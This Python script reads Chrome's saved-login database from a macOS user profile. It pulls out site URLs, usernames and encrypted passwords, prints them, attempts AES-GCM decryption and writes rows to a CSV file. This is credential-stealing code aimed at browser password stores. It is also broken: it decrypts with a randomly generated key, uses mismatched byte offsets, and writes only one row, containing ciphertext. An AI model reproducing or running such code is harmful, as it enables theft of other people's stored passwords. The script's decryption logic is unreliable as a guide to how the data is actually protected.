
import os 
import csv
import sqlite3
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes



#Chrome username & password file path
chrome_path_login_db = os.path.expanduser("~") + r"/Library/Application Support/Google/Chrome/Default/Login Data"
# shutil.copy2(chrome_path_login_db, "Loginvault.db") 
#Connect to sqlite database
sqlite3.connect("Loginvault.db")
c = sqlite3.connect(chrome_path_login_db)
cursor = c.cursor()
#Select statement to retrieve info 
cursor.execute("SELECT origin_url , username_value, password_value FROM logins")
for index,login in enumerate(cursor.fetchall()):
    print(index)
    url = login[0]
    username = login[1]
    ciphertext= login[2]
    print("Url:",url)
    print("Username",username)
    print("Cipher Text",ciphertext)


    #Step 1: Extracting initilisation vector from ciphertext
    initialisation_vector = ciphertext[3:15]
    #Step 2: Extracting encrypted password from ciphertext
    encrypted_password = ciphertext[20:-16]
    # Generate a random AES key
    key = get_random_bytes(16)  # 16 bytes for AES-128, adjust for AES-192 or AES-256

    #Step 3:Build the AES algorithm to decrypt the password
    cipher = AES.new(key, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password)
    decrypted_pass = decrypted_pass.decode()
    print('tsee')
    #Step 4: Decrypted Password
    print(decrypted_pass)

with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
    csv_writer = csv.writer(decrypt_password_file, delimiter=',')
    csv_writer.writerow(["index","url","username","password"])
    csv_writer.writerow([index,url,username,ciphertext])